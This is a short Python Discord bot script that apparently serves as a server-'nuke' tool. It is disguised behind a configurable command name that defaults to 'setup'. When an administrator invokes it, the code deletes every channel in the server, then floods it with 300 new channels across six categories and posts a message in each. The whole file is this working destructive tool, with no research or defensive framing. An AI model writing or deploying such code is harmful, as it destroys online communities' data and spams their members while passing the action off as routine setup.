import discord
from discord.ext import commands
import json

# Load configuration from bot.json
with open('bot.json', 'r') as f:
    data = json.load(f)
    bot_token = data.get('bot_token')
    command_name = data.get('command_name', 'setup')  # Get the command name from the json file

intents = discord.Intents.all()
intents.guilds = True
intents.messages = True

bot = commands.Bot(command_prefix='.', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')
    print('Bot is ready.')

async def setup_command(ctx):
    await bot.wait_until_ready()

    if ctx.author.guild_permissions.administrator:
        guild = ctx.guild
        for channel in guild.channels:
            await channel.delete()

        channel_name = data.get('channel_name', 'gg')
        category_name = data.get('category_name', 'Report')
        message_content = data.get('message_content', 'HELLO I\'M HERE')

        num_channels_per_category = 50
        num_categories = 0

        while True:
            category = await guild.create_category(f"{category_name}_{num_categories + 1}")

            for i in range(num_channels_per_category):
                new_channel = await category.create_text_channel(f"{channel_name}_{i + 1}")
                if isinstance(new_channel, discord.TextChannel):
                    for _ in range(1):
                        await new_channel.send(message_content)

            num_categories += 1

            # Break the loop if the total number of channels exceeds 300
            total_channels = num_channels_per_category * num_categories
            if total_channels >= 300:
                break

        await ctx.send("Command executed ;)")
    else:
        await ctx.send("You don't have the required permissions.")

# Dynamically add the setup command with the name specified in the json file
bot.command(name=command_name)(setup_command)

bot.run(bot_token)
